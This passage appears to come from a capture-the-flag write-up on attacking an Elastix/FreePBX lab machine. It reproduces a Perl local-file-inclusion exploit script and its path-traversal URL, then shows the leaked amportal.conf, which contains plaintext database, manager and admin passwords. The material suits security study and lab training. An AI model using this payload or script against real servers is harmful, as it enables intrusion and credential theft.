Elastix 2.x - Blind SQL Injection                                                                                                   | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                                                  | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                              | php/webapps/18650.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Oh wow, couple interesting stuff, but nothing for Metasploit.

What about VTigerCRM?
```
hippoeug@kali:~$ searchsploit vtigercrm
Exploits: No Results
Shellcodes: No Results
```
Nothing. Let's focus on Elastix exploits. Let's also try to get the version of Elastix being ran.
However, neither the landing page nor Gobuster/Dirbuster revealed the version of Elastix. Viewing Elastix page source on 443 didn't reveal the version either.

## 7. Attacking Elastix on Port 443
Using Burp to intercept a response from Elastix, we still do not find any version numbers. Let's just try using some of the exploits we saw from doing `searchsploit elastix`.

Trying the first one, `Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl`, we examine it first.
```
hippoeug@kali:~$ searchsploit -x 37637.pl
  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
      URL: https://www.exploit-db.com/exploits/37637
     Path: /usr/share/exploitdb/exploits/php/webapps/37637.pl
File Type: ASCII text, with CRLF line terminators

source: https://www.securityfocus.com/bid/55078/info
Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.
An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks.
Elastix 2.2.0 is vulnerable; other versions may also be affected. 

#!/usr/bin/perl -w

#------------------------------------------------------------------------------------# 
#Elastix is an Open Source Sofware to establish Unified Communications. 
#About this concept, Elastix goal is to incorporate all the communication alternatives,
#available at an enterprise level, into a unique solution.
#------------------------------------------------------------------------------------#
############################################################
# Exploit Title: Elastix 2.2.0 LFI
# Google Dork: :(
# Author: cheki
# Version:Elastix 2.2.0
# Tested on: multiple
# CVE : notyet
# romanc-_-eyes ;) 
# Discovered by romanc-_-eyes
# vendor http://www.elastix.org/

print "\t Elastix 2.2.0 LFI Exploit \n";
print "\t code author cheki   \n";
print "\t 0day Elastix 2.2.0  \n";
print "\t email: anonymous17hacker{}gmail.com \n";

#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

use LWP::UserAgent;
print "\n Target: https://ip ";
chomp(my $target=<STDIN>);
$dir="vtigercrm";
$poc="current_language";
$etc="etc";
$jump="../../../../../../../..//";
$test="amportal.conf%00";

$code = LWP::UserAgent->new() or die "inicializacia brauzeris\n";
$code->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . "/".$dir."/graph.php?".$poc."=".$jump."".$etc."/".$test."&module=Accounts&action";
$res = $code->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~ 'This file is part of FreePBX') {
 
print "\n read amportal.conf file : $answer \n\n";
print " successful read\n";
 
}
else { 
print "\n[-] not successful\n";
}
```
Primarily, we are interested in `#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`.

From our earlier Dirbuster search, we've already seen a directory `/vtigercrm`.
Going to our web browser, we go to `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`, but somehow got redirected to `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%2500&module=Accounts&action`, with the error message `Sorry! Attempt to access restricted file.` displayed. We manually change the URL again, and this time, get a valid HTML page. However, it's just a chunk of text and we see the page source to see a formated version.
```

```
- This file is part of FreePBX.
-
-    FreePBX is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 2 of the License, or
-    (at your option) any later version.
-
-    FreePBX is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
-
-    You should have received a copy of the GNU General Public License
-    along with FreePBX.  If not, see <http://www.gnu.org/licenses/>.
-
- This file contains settings for components of the Asterisk Management Portal
- Spaces are not allowed!
- Run /usr/src/AMP/apply_conf.sh after making changes to this file

- FreePBX Database configuration
- AMPDBHOST: Hostname where the FreePBX database resides
- AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
- AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
- AMPDBUSER: Username used to connect to the FreePBX database
- AMPDBPASS: Password for AMPDBUSER (above)
- AMPENGINE: Telephony backend engine (e.g. asterisk)
- AMPMGRUSER: Username to access the Asterisk Manager Interface
- AMPMGRPASS: Password for AMPMGRUSER
-
AMPDBHOST=localhost
AMPDBENGINE=mysql
- AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
- AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
-AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

- AMPBIN: Location of the FreePBX command line scripts
- AMPSBIN: Location of (root) command line scripts
-
AMPBIN=/var/lib/asterisk/bin
AMPSBIN=/usr/local/sbin

- AMPWEBROOT: Path to Apache's webroot (leave off trailing slash)
- AMPCGIBIN: Path to Apache's cgi-bin dir (leave off trailing slash)
- AMPWEBADDRESS: The IP address or host name used to access the AMP web admin
-
AMPWEBROOT=/var/www/html
AMPCGIBIN=/var/www/cgi-bin 
- AMPWEBADDRESS=x.x.x.x|hostname

- FOPWEBROOT: Path to the Flash Operator Panel webroot (leave off trailing slash)
- FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
- FOPRUN: Set to true if you want FOP started by freepbx_engine (amportal_start), false otherwise
- FOPDISABLE: Set to true to disable FOP in interface and retrieve_conf.  Useful for sqlite3 
- or if you don't want FOP.
-
-FOPRUN=true
FOPWEBROOT=/var/www/html/panel
-FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

- FOPSORT=extension|lastname
- DEFAULT VALUE: extension
- FOP should sort extensions by Last Name [lastname] or by Extension [extension]

- This is the default admin name used to allow an administrator to login to ARI bypassing all security.
- Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
ARI_ADMIN_USERNAME=admin

- This is the default admin password to allow an administrator to login to ARI bypassing all security.
- Change this to a secure password.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE

- AUTHTYPE=database|none
- Authentication type to use for web admininstration. If type set to 'database', the primary
- AMP admin credentials will be the AMPDBUSER/AMPDBPASS above.
AUTHTYPE=database

- AMPADMINLOGO=filename
- Defines the logo that is to be displayed at the TOP RIGHT of the admin screen. This enables
- you to customize the look of the administration screen.
- NOTE: images need to be saved in the ..../admin/images directory of your AMP install
- This image should be 55px in height
AMPADMINLOGO=logo.png

- USECATEGORIES=true|false
- DEFAULT VALUE: true
- Controls if the menu items in the admin interface are sorted by category (true), or sorted 
- alphabetically with no categories shown (false).

- AMPEXTENSIONS=extensions|deviceanduser
- Sets the extension behavior in FreePBX.  If set to 'extensions', Devices and Users are
- administered together as a unified Extension, and appear on a single page.
- If set to 'deviceanduser', Devices and Users will be administered seperately.  Devices (e.g. 
- each individual line on a SIP phone) and Users (e.g. '101') will be configured 
- independent of each other, allowing association of one User to many Devices, or allowing 
- Users to login and logout of Devices.
AMPEXTENSIONS=extensions

- ENABLECW=true|false
ENABLECW=no
- DEFAULT VALUE: true
- Enable call waiting by default when an extension is created. Set to 'no' to if you don't want 
- phones to be commissioned with call waiting already enabled. The user would then be required
- to dial the CW feature code (*70 default) to enable their phone. Most installations should leave
- this alone. It allows multi-line phones to receive multiple calls on their line appearances.

- CWINUSEBUSY=true|false
- DEFAULT VALUE: true
- For extensions that have CW enabled, report unanswered CW calls as 'busy' (resulting in busy 
- voicemail greeting). If set to no, unanswered CW calls simply report as 'no-answer'.

- AMPBADNUMBER=true|false
- DEFAULT VALUE: true
- Generate the bad-number context which traps any bogus number or feature code and plays a
- message to the effect. If you use the Early Dial feature on some Grandstream phones, you
- will want to set this to false.

- AMPBACKUPSUDO=true|false
- DEFAULT VALUE: false
- This option allows you to use sudo when backing up files. Useful ONLY when using AMPPROVROOT
- Allows backup and restore of files specified in AMPPROVROOT, based on permissions in /etc/sudoers
- for example, adding the following to sudoers would allow the user asterisk to run tar on ANY file
- on the system:
-	asterisk localhost=(root)NOPASSWD: /bin/tar
-	Defaults:asterisk !requiretty
- PLEASE KEEP IN MIND THE SECURITY RISKS INVOLVED IN ALLOWING THE ASTERISK USER TO TAR/UNTAR ANY FILE

- CUSTOMASERROR=true|false
- DEFAULT VALUE: true
- If false, then the Destination Registry will not report unknown destinations as errors. This should be
- left to the default true and custom destinations should be moved into the new custom apps registry.

- DYNAMICHINTS=true|false
- DEFAULT VALUE: false
- If true, Core will not statically generate hints, but instead make a call to the AMPBIN php script, 
- and generate_hints.php through an Asterisk's -exec call. This requires Asterisk.conf to be configured 
- with "execincludes=yes" set in the [options] section.

- XTNCONFLICTABORT=true|false
- BADDESTABORT=true|false
- DEFAULT VALUE: false
- Setting either of these to true will result in retrieve_conf aborting during a reload if an extension
- conflict is detected or a destination is detected. It is usually better to allow the reload to go
- through and then correct the problem but these can be set if a more strict behavior is desired.

- SERVERINTITLE=true|false
- DEFAULT VALUE: false
- Precede browser title with the server name.

- USEDEVSTATE = true|false
- DEFAULT VALUE: false
- If this is set, it assumes that you are running Asterisk 1.4 or higher and want to take advantage of the
- func_devstate.c backport available from Asterisk 1.6. This allows custom hints to be created to support
- BLF for server side feature codes such as daynight, followme, etc.

- MODULEADMINWGET=true|false
- DEFAULT VALUE: false
- Module Admin normally tries to get its online information through direct file open type calls to URLs that
- go back to the freepbx.org server. If it fails, typically because of content filters in firewalls that
- don't like the way PHP formats the requests, the code will fall back and try a wget to pull the information.
- This will often solve the problem. However, in such environment there can be a significant timeout before
- the failed file open calls to the URLs return and there are often 2-3 of these that occur. Setting this
- value will force FreePBX to avoid the attempt to open the URL and go straight to the wget calls.

- AMPDISABLELOG=true|false
- DEFAULT VALUE: true
- Whether or not to invoke the FreePBX log facility

- AMPSYSLOGLEVEL=LOG_EMERG|LOG_ALERT|LOG_CRIT|LOG_ERR|LOG_WARNING|LOG_NOTICE|LOG_INFO|LOG_DEBUG|LOG_SQL|SQL
- DEFAULT VALUE: LOG_ERR
- Where to log if enabled, SQL, LOG_SQL logs to old MySQL table, others are passed to syslog system to
- determine where to log

- AMPENABLEDEVELDEBUG=true|false
- DEFAULT VALUE: false
- Whether or not to include log messages marked as 'devel-debug' in the log system

- AMPMPG123=true|false 
- DEFAULT VALUE: true
- When set to false, the old MoH behavior is adopted where MP3 files can be loaded and WAV files converted
- to MP3. The new default behavior assumes you have mpg123 loaded as well as sox and will convert MP3 files
- to WAV. This is highly recommended as MP3 files heavily tax the system and can cause instability on a busy
- phone system.

- CDR DB Settings: Only used if you don't use the default values provided by FreePBX.
- CDRDBHOST: hostname of db server if not the same as AMPDBHOST
- CDRDBPORT: Port number for db host 
- CDRDBUSER: username to connect to db with if it's not the same as AMPDBUSER
- CDRDBPASS: password for connecting to db if it's not the same as AMPDBPASS
- CDRDBNAME: name of database used for cdr records
- CDRDBTYPE: mysql or postgres mysql is default
- CDRDBTABLENAME: Name of the table in the db where the cdr is stored cdr is default 

- AMPVMUMASK=mask 
- DEFAULT VALUE: 077 
- Defaults to 077 allowing only the asterisk user to have any permission on VM files. If set to something
- like 007, it would allow the group to have permissions. This can be used if setting apache to a different
- user then asterisk, so that the apache user (and thus ARI) can have access to read/write/delete the
- voicemail files. If changed, some of the voicemail directory structures may have to be manually changed.

- DASHBOARD_STATS_UPDATE_TIME=integer_seconds
- DEFAULT VALUE: 6
- DASHBOARD_INFO_UPDATE_TIME=integer_seconds
- DEFAULT VALUE: 20
- These can be used to change the refresh rate of the System Status Panel. Most of
- the stats are updated based on the STATS interval but a few items are checked
- less frequently (such as Asterisk Uptime) based on the INFO value

- ZAP2DAHDICOMPAT=true|false
ZAP2DAHDICOMPAT=true
- DEFAULT VALUE: false
- If set to true, FreePBX will check if you have chan_dadhi installed. If so, it will
- automatically use all your ZAP configuration settings (devices and trunks) and
- silently convert them, under the covers, to DAHDI so no changes are needed. The
- GUI will continue to refer to these as ZAP but it will use the proper DAHDI channels.
- This will also keep Zap Channel DIDs working.

- CHECKREFERER=true|false
- DEFAULT VALUE: true
- When set to the default value of true, all requests into FreePBX that might possibly add/edit/delete
- settings will be validated to assure the request is coming from the server. This will protect the system
- from CSRF (cross site request forgery) attacks. It will have the effect of preventing legitimately entering
- URLs that could modify settings which can be allowed by changing this field to false.

- USEQUEUESTATE=true|false
- DEFAULT VALUE: false
- Setting this flag will generate the required dialplan to integrate with the following Asterisk patch:
- https://issues.asterisk.org/view.php?id=15168
- This feature is planned for a future 1.6 release but given the existence of the patch can be used prior. Once
- the release version is known, code will be added to automatically enable this format in versions of Asterisk
- that support it.

- USEGOOGLEDNSFORENUM=true|false
- DEFAULT VALUE: false
- Setting this flag will generate the required global variable so that enumlookup.agi will use Google DNS
- 8.8.8.8 when performing an ENUM lookup. Not all DNS deals with NAPTR record, but Google does. There is a
- drawback to this as Google tracks every lookup. If you are not comfortable with this, do not enable this
- setting. Please read Google FAQ about this: http://code.google.com/speed/public-dns/faq.html-privacy

- MOHDIR=subdirectory_name
- This is the subdirectory for the MoH files/directories which is located in ASTVARLIBDIR
- if not specified it will default to mohmp3 for backward compatibility.
MOHDIR=mohmp3
- RELOADCONFIRM=true|false
- DEFAULT VALUE: true
- When set to false, will bypass the confirm on Reload Box

- FCBEEPONLY=true|false
- DEFAULT VALUE: false
- When set to true, a beep is played instead of confirmation message when activating/de-activating:
- CallForward, CallWaiting, DayNight, DoNotDisturb and FindMeFollow

- DISABLECUSTOMCONTEXTS=true|false
- DEFAULT VALUE: false
- Normally FreePBX auto-generates a custom context that may be usable for adding custom dialplan to modify the
- normal behavior of FreePBX. It takes a good understanding of how Asterisk processes these includes to use
- this and in many of the cases, there is no useful application. All includes will result in a WARNING in the
- Asterisk log if there is no context found to include though it results in no errors. If you know that you
- want the includes, you can set this to true. If you comment it out FreePBX will revert to legacy behavior
- and include the contexts.

- AMPMODULEXML lets you change the module repository that you use. By default, it
- should be set to http://mirror.freepbx.org/ - Presently, there are no third
- party module repositories.
AMPMODULEXML=http://mirror.freepbx.org/

- AMPMODULESVN is the prefix that is appended to <location> tags in the XML file.
- This should be set to http://mirror.freepbx.org/modules/
AMPMODULESVN=http://mirror.freepbx.org/modules/

AMPDBNAME=asterisk

ASTETCDIR=/etc/asterisk
ASTMODDIR=/usr/lib/asterisk/modules
ASTVARLIBDIR=/var/lib/asterisk
ASTAGIDIR=/var/lib/asterisk/agi-bin
ASTSPOOLDIR=/var/spool/asterisk
ASTRUNDIR=/var/run/asterisk
ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
```
